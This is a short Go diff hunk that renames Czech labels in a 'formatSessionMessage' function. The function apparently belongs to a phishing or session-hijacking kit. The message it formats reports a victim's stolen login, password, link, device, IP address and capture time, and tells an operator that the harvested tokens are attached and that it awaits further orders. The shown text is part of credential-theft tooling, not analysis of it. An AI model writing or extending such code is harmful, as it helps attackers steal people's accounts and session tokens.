@@ -178,10 +178,10 @@ func formatSessionMessage(session TSession) string {
 		"👤 Login:        ➖ %s\n"+
 		"🔑 Heslo:      ➖ %s\n"+
 		"🌐 LINK:          ➖ %s\n \n"+
-		"🖥️ STROJ:         ➖ %s\n"+
+		"🖥️ Zařízení:         ➖ %s\n"+
 		"🌍 IP ADRESA:     ➖ %s\n"+
 		"🕒 NATAŽENO:      ➖ %d\n"+
-		"🕔 POSLEDNÍ LOG:  ➖ %d\n"+
+		"🕔 POSLEDNÍ ZÁZNAM:  ➖ %d\n"+
 		"\n"+
 		"📦 Ty tokeny jsem hodil do .txt, jak jste chtěl. Je to v příloze. Čekám na další rozkazy.\n",
 
